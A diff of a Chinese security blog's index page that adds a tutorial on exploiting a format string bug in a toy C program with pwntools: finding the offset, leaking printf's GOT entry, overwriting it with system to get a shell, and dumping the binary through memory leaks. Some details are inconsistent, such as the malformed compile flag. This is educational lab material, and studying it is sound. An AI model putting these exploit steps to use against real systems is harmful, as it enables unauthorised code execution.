@@ -131,7 +131,7 @@
       <div class="body-wrap">
         
   
-    <article id="post-Windows下漏洞调试神器mona" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-格式化字符串漏洞的利用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -141,7 +141,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/30/Windows下漏洞调试神器mona/">Windows下漏洞调试神器之mona</a>
+      <a class="article-title" href="/2016/06/30/格式化字符串漏洞的利用/">格式化字符串漏洞的利用</a>
     </h1>
   
       
@@ -149,21 +149,37 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>corelan团队的mona插件，可以运行在Windbg和ImmunityDebugger中。</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/03/30/Windows下漏洞调试神器mona/#more">more >></a>
-        </p>
+        <a id="more"></a>
+<p>我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？<br>这一节主要熟悉一下pwntools的使用。</p>
+<p>首先我们来看源程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv)&#123;</div><div class="line">	char a[1024];	</div><div class="line">	while(1)&#123;</div><div class="line">		memset(a, &apos;\0&apos;, 1024);</div><div class="line">		read(0, a, 1024);</div><div class="line">		printf(a);</div><div class="line">		fflush(stdout);</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>gcc -m32 -fno-protector -O0 fmttest.c -o fmttest<br>程序编译时开启了栈保护。</p>
+<p>在这个程序中，我们为了实验方便，循环读取输入，然后使用printf输出。<br>很明显可以看出这里存在格式化字符串漏洞。那么为了写入shell，我们的思路是将printf函数的地址改成system函数的地址，这样当我们再次输入”/bin/sh”时，就可以获得shell了。</p>
+<p>先说一个知识点，就是格式化字符串中的”$”<br>一般情况下，如果我们的字符串为”%x”，就会将取1个参数，那么如果是”%3$x”，则是取出第三个参数。即利用”$”可以取出任意位置的参数。利用这点，可以做很多是，比如dump处程序的bin文件。</p>
+<p>当”$”取出的第N个参数刚好是该字符串的地址是，我们称N为offset。<br>比如当 N=4 时，我们可以构造这样一个payload： addr + “%4$s” ，那么printf就会打印出addr指向的内存的字符串，知道\0为止。这样就是所谓的内存泄露。比如我们利用这样特性， 将addr构造成print函数的地址（print_got）,那么我们就讲得到printf函数在程序中的地址了。</p>
+<p>所以在这题中，可以使用pwntools先获得offset：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;./fmttest&apos;)</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">	r = process(&apos;./fmttest&apos;)</div><div class="line">	r.sendline(payload)</div><div class="line">	info = r.recv()</div><div class="line">	r.close()</div><div class="line">	return info</div><div class="line">auto = FmtStr(exec_fmt)</div><div class="line">print auto.offset</div></pre></td></tr></table></figure>
+<p><img src="/image/格式化字符串漏洞的利用/1.png" alt="这里写图片描述"></p>
+<p>offset为4</p>
+<p>接着在IDA中找到printf的got地址为：0x804a010,然后获取printf函数的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">r = process(&apos;./fmttest&apos;)</div><div class="line"></div><div class="line">print_got = 0x804a010</div><div class="line">payload = p32(print_got) + &apos;%4$s&apos;</div><div class="line"></div><div class="line">r.send(payload)</div><div class="line">print_addr = u32(r.recv()[4:8]) #第一次收到后发现不止4个字节，截取有用的</div><div class="line">log.success(&quot;printf_address =&gt; &#123;&#125;&quot;.format(hex(print_addr)))</div></pre></td></tr></table></figure>
+<p><img src="/image/格式化字符串漏洞的利用/2.png" alt="这里写图片描述"></p>
+<p>根据给出的lib（假设是给了的）算出两者的偏移为0xd100，得出system的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">print_system_offset = 0xd100</div><div class="line">read_got = 0x804a00c</div><div class="line">system_addr = print_addr - print_system_offset</div><div class="line"></div><div class="line">log.success(&quot;system =&gt; &#123;&#125;&quot;.format(hex(system_addr)))</div><div class="line">payload = fmtstr_payload(4, &#123;print_got : 0xf7e46310&#125;)</div><div class="line">r.send(payload)</div><div class="line">r.send(&apos;/bin/sh&apos;)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>这样就获取到了shell：<br><img src="/image/格式化字符串漏洞的利用/3.png" alt="这里写图片描述"></p>
+<p>同时，这样的内存泄露也可以用于dump处bin文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">f = open(&apos;source&apos;, &apos;ab+&apos;)</div><div class="line"></div><div class="line">begin = 0x8048000</div><div class="line">offset = 0</div><div class="line"></div><div class="line">while True:</div><div class="line">	addr = begin + offset</div><div class="line">	p = process(&apos;./fmttest&apos;)</div><div class="line">	p.sendline(&quot;%6$saaaa&quot; + p32(addr))</div><div class="line"></div><div class="line">	try:</div><div class="line">		info = p.recvuntil(&apos;aaaa&apos;)[-4]</div><div class="line">	except EOFError:</div><div class="line">		print offset </div><div class="line">		break</div><div class="line"></div><div class="line">	info += &apos;\x00&apos;</div><div class="line">	p.close()</div><div class="line">	offset += len(info)</div><div class="line">	f.write(info)</div><div class="line">	f.flush()</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/03/30/Windows下漏洞调试神器mona/" class="archive-article-date">
-  	<time datetime="2016-03-30T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-30</time>
+      <a href="/2016/06/30/格式化字符串漏洞的利用/" class="archive-article-date">
+  	<time datetime="2016-06-30T03:54:32.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-06-30</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
@@ -183,7 +199,7 @@
 
 
   
-    <article id="post-在栈中利用SEH" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-retn的作用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -193,7 +209,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/29/在栈中利用SEH/">在栈中利用SEH</a>
+      <a class="article-title" href="/2016/05/17/retn的作用/">retn的作用</a>
     </h1>
   
       
@@ -201,21 +217,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>文中用到的两个插件：<br><a href="/image/在栈中利用SEH/ollysseh.zip">ollysseh</a><br><a href="/image/在栈中利用SEH/findjmp.exe">findjmp.exe</a><br>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/03/29/在栈中利用SEH/#more">more >></a>
-        </p>
+        <a id="more"></a>
+<p>就是子程序返回，然后把堆栈的N个字节弹出来。<br>其实就是执行ret后，将n加入sp中，实际上是从堆栈中弹出n个字节的数据，以冲掉在call指令前压入堆栈的参数。<br>相当于这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ret</div><div class="line">add sp，n</div></pre></td></tr></table></figure></p>
+<p>因为8086/8088的堆栈是字堆栈（就是说进栈出栈都是16位的），所以，ret n中的n必须是偶数。</p>
+
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/03/29/在栈中利用SEH/" class="archive-article-date">
-  	<time datetime="2016-03-29T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-29</time>
+      <a href="/2016/05/17/retn的作用/" class="archive-article-date">
+  	<time datetime="2016-05-17T09:29:28.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-17</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
 	</div>
 
       
@@ -235,7 +251,7 @@
 
 
   
-    <article id="post-PWN练习(绕过GS保护)" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-简单的分配栈帧及溢出修改相邻变量" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -245,7 +261,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/29/PWN练习(绕过GS保护)/">PWN练习（绕过GS保护）</a>
+      <a class="article-title" href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/">简单的分配栈帧及溢出修改相邻变量</a>
     </h1>
   
       
@@ -253,21 +269,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>程序：<a href="/image/PWN练习_绕过GS保护/test_x86_wo_safeseh_dep.exe">test</a><br>
+        <p>上一段简单的源码：</p>
         <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/03/29/PWN练习(绕过GS保护)/#more">more >></a>
+          <a class="article-more-a"  href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/#more">more >></a>
         </p>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/03/29/PWN练习(绕过GS保护)/" class="archive-article-date">
-  	<time datetime="2016-03-29T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-29</time>
+      <a href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/" class="archive-article-date">
+  	<time datetime="2016-05-11T09:09:59.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-05-11</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
 	</div>
 
       
